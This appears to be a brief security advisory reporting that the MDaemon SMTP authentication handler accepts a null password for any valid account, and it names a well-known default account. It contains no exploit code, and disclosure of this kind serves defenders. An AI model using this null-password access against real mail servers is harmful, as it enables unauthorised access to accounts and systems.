A vulnerability has been reported to affect the MDaemon SMTP authentication handler.

It has been reported that any valid username or account can be used in conjunction with a null password, to access the MDaemon SMTP server. This issue may be exaggerated, because a default MDaemon account 'MDaemon' is well known.
